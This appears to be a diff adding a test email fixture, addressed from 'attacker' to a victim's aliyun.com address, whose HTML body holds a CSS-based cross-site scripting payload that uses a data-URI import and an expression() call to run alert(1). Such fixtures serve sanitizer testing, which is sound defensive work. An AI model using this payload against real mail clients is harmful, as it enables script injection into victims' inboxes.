@@ -1,0 +1,7 @@
+From: <attacker@attacker.com>
+Subject: 11
+To: victim@aliyun.com
+MIME-Version: 1.0
+Content-type: text/html
+
+<style>@import "data:,*%7bx:expression(alert(1))%7D";</style>
